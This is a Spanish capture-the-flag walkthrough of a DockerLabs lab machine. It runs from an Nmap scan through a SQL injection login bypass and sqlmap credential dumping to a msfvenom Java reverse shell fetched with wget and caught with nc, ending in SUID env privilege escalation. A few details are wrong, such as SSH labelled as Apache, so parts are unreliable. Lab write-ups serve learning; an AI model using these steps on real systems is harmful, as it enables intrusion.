# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/f4b82c25-f28d-4ccc-a242-ca404be16290)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos

1. **22/tcp(SSH):** Apache httpd 2.4.52 (Ubuntu)
2.  **80/tcp(HTTP):** Apache httpd 2.4.52
3. **139/tcp(SMB):** Samba smbd 4.6.2
4. **445/tcp(SMB):** Samba smbd 4.6.2
### Puerto 8080
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Esto llevo a un login.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/9e4eb0e7-31b2-4684-a358-9bcce926894c)

# Fase 2- Exploración

#### Feroxbuster

No se encontró nada.


# Fase 3- Explotación

#### Admin'
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/336a8d34-9c7d-4015-ac93-6924d468a742)
Probamos las credenciales `admin` `admin` pero no funcionaron.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/fc344e00-d2a2-4119-9302-68c7f2336d5a)
Cuando introducimos `admin'` como entrada en el panel de login, nos sale un SQL ERROR, es probable que el sistema esté construyendo una consulta SQL que podría lucir así:
```python
SELECT * FROM users WHERE username = 'admin'';
```

Para explotar este error podríamos probar:
```python
SELECT * FROM users WHERE username = 'admin'' or 1=1 -- -' AND password = 'xxx';
```
En SQL injection, `' or 1=1 -- -` hace que la condición `1=1` sea verdadera, evitando la verificación de contraseña, y `-- -` es un comentario para evitar errores de sintaxis.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/adba4299-63c3-470c-be2b-37b1ba6adde2)

Y Entramos. Nos dice `Bienvenido Dylan! Has accedido correctamente.` Posible usuario para fuerza bruta.

#### Contraseña
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/d42f4914-a538-4dfc-b958-daf95b1cfcea)
Queremos averiguar la contraseña del usuario, entonces usamos SQLMap. El comando es el siguiente:
```python
sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch
```
Esto va hacer un escaneo de las bases de datos que encuentre.

```python
sqlmap -u http://172.17.0.2/index.php --forms -D register --tables --batch
```

```python
sqlmap -u http://172.17.0.2/index.php --forms -D register -T users --columns --batch
```

```python
`sqlmap -u http://172.17.0.2/index.php --forms -D register -T users -C passwd,username --dump --batch`
```
```
+------------------+----------+
| passwd           | username |
+------------------+----------+
| KJSDFG789FGSDF78 | dylan    |
+------------------+----------+
```
Encontramos la contraseña del usuario Dylan.

#### Smb
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/93cecf08-f295-47b2-b6c3-9f1160293d4e)
Nos fijamos en smb y vemos que tenemos permisos de lectura y escritura como el usuario dylan en shared.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/61101ba7-cc7f-47af-af45-88ffeb3c50bd)
Dentro del directorio shared existe un archivo llamado `augustus.txt` que contiene una clave o hash: `061fba5bdfc076bb7362616668de87c8`.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/2c350d4b-cf63-41ba-95e6-b67febccf253)

Usando la herramienta Jhon le sacamos la encriptación de MD5. y tenemos posible usuario y contraseña.

#### Augustus
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/48439a73-a69d-4294-87f2-369d6c52f477)

Y estamos dentro!

# Fase 4- Privilegios

#### sudo -l
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/a264e05c-00f1-4e78-b62f-acaf39e0cf2f)
Despues de realizar el tratamiento de la TTY. Al hacer el comando `sudo -l` vemos que podemos ejecutar el binario java como el usuario `dylan`.

#### Java
Buscando en internet, encontré una pagina web que lo que nos dice es que para escalar privilegios con el binario java, es necesario realizar los siguientes pasos:
Maquina Atacante: >
Maquina Victima: $!
```python
> msfvenom -p java/shell_reverse_tcp LHOST=<local-ip> LPORT=4444 -f jar -o shell.jar
> python3 -m http.server 80

$! wget 172.17.0.1/shell.jar

> nc -nlvp 4444

$! sudo -u dylan /usr/bin/java -jar /tmp/shell.jar
```
Realizando Estos pasos ya estamos dentro como el usuario `dylan`.

#### Dylan
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/d6af22e4-1539-4f2d-8cfd-a454e98b9aef)

Como no sabemos la contraseña del usuario `dylan`, realizamos un `find / -perm -4000 -user root 2>/dev/null`, y vemos que tenemos permisos del binario `env`.
```
dylan@41cc9028288e:/tmp$ /usr/bin/env /bin/sh -p
# whoami
root
# 
```
Maquina finalizada como usuario root!.

